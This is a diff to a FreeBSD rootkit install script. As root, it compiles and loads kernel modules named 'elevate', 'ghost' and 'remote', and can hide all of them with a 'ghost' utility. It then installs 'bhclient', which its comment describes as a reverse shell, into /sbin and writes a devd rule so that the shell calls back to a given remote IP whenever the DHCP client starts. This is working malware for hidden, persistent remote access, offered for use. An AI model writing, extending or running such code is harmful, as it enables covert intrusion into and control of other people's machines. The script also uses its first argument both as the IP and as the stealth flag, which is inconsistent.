@@ -3,21 +3,31 @@
 uid=$(id -u)
 
 if [ "$uid" -ne 0 ]; then
-  echo "Install script must be executed as root"
+  echo "Error: install script must be executed as root"
   exit 1
 fi
 
-klds="elevate ghost"
+if [ -z "$1" ]; then
+  echo "Usage: $0 <remote-ip>"
+  exit 0
+fi
+
+# Add all KLDs here, we will automatically compile, load and hide them.
+# You should add the module name here.
+# The Makefile should be named Makefile.module
+# The .ko file should be named module.ko
+# The c file should be named module-kld.c
+klds="elevate ghost remote"
 
 for kld in ${klds}; do
   # Clean kld
   make -f "Makefile.$kld" clean
 
   # Compile KLD
-  make -f "Makefile.$kld"
+  make -f "Makefile.$kld" REMOTE="$1"
 
   if [ "$?" -ne 0 ]; then
-    echo "Error: failed to compile $kld KLD"
+    echo "Warning: failed to compile $kld KLD"
     continue
   fi
 
@@ -25,11 +35,11 @@ for kld in ${klds}; do
   if [ -e "./$kld.ko" ]; then
     kldload "./$kld.ko"
     if [ "$?" -ne 0 ]; then
-      echo "Error: failed to load $kld.ko with kldload"
+      echo "Warning: failed to load $kld.ko with kldload"
       continue
     fi
   else
-    echo "Error: could not find $kld.ko"
+    echo "Warning: could not find $kld.ko"
     continue
   fi
 done
@@ -43,10 +53,27 @@ if [ "$?" -ne 0 ]; then
 fi
 
 # Hide KLDs with ghost utility, add other klds here to hide them
-# Pass in module name found via kldstat -v
-if [ -e "./ghost" ]; then
-  ./ghost elevate
-  ./ghost ghost
+if [ -e "./ghost" ] && [ "$1" = "-s" ]; then
+  for kld in ${klds}; do
+    ./ghost "$kld"
+  done
 else
-  echo "Error: could not find ghost utility, kld will not be hidden"
+  echo "Warning: could not find ghost utility or stealth mode was not enabled"
+fi
+
+# Install bhclient (reverse shell) to /sbin
+install -o root -g wheel -m 755 bhclient /sbin/bhclient
+
+# Add matching rule in /etc/devd.conf to run reverse shell to remote address
+if ! grep -q "DHCLIENT" /etc/devd.conf; then
+  mkdir -p /usr/local/etc/devd
+  cat <<EOF > /usr/local/etc/devd/devd.conf
+notify 100 {
+  match "system" "DHCLIENT";
+  match "subsystem" "WORKER";
+  match "type" "START";
+  action "/sbin/bhclient ${1}";
+};
+EOF
+service devd restart
 fi
